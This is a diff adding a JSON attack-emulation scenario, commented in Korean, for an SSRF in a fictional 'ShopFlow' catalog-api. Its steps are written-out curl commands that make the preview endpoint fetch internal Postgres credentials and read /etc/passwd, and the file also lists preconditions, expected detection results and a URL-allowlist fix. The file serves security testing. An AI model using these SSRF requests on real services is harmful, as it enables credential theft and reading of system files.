@@ -1,0 +1,42 @@
+{
+  "_note": "핵심층 환경 — ShopFlow catalog-api SSRF(A2). 상품 미리보기 URL 을 내부 서비스로 돌려 admin-dashboard Secret 엔드포인트·k8s API·로컬파일을 읽는다. 메인 킬체인 ①(wiki)을 거치지 않고 ②(confused deputy)에 직접 닿는 대체 경로. 방어: patch_app catalog-api(URL allowlist).",
+
+  "env": "shopflow-ssrf",
+  "technique": "T1190",
+  "cwe": "CWE-918",
+
+  "procedure": {
+    "id": "PROC-shopflow-ssrf",
+    "name": "catalog-api SSRF 로 내부 서비스 경유 자격증명 탈취",
+    "description": "frontend 발판에서 catalog-api POST /api/products/preview 에 내부 URL 을 넣어 서버가 대신 요청하게 한다. admin-dashboard 의 /internal/secret/database/postgres-credentials 를 SSRF 로 읽으면 DB 비밀번호를 얻어 ③④(psql 직접 접속)로 합류한다. file:///etc/passwd 등 로컬파일 읽기도 가능.",
+    "status": "AUTHORED",
+    "steps": [
+      {"id": "STEP-ssrf-creds", "seq": 1,
+       "command": "curl -s -XPOST http://catalog-api.backend.svc.cluster.local:8080/api/products/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/database/postgres-credentials\"}'",
+       "description": "SSRF 로 admin-dashboard 경유 DB Secret 조회 — base64 인코딩된 POSTGRES_PASSWORD 가 응답에 포함"},
+      {"id": "STEP-ssrf-localfile", "seq": 2,
+       "command": "curl -s -XPOST http://catalog-api.backend.svc.cluster.local:8080/api/products/preview -H 'Content-Type: application/json' -d '{\"url\":\"file:///etc/passwd\"}'",
+       "description": "file:// 스킴으로 서버 로컬 파일 읽기 확인(SSRF 범위 증명)"}
+    ]
+  },
+
+  "preconditions": [
+    {
+      "id": "PRE-ssrf-preview-reachable",
+      "name": "발판에서 catalog-api preview 엔드포인트 도달 가능",
+      "description": "frontend 발판에서 catalog-api /api/products/preview 에 POST 요청을 보낼 수 있고, URL 검증이 없어 내부·file 스킴을 수용."
+    }
+  ],
+
+  "expected_results": [
+    {
+      "id": "ER-ssrf-progress",
+      "name": "SSRF 로 내부 자격증명 수집 흔적 (진행도)",
+      "kind": "progress",
+      "outcome": {"id": "AO-credential-access", "name": "자격증명 수집"},
+      "conditions": [
+        {"channel": "app", "field": "technique", "operator": "eq", "expected": "WEB_SSRF"}
+      ]
+    }
+  ]
+}
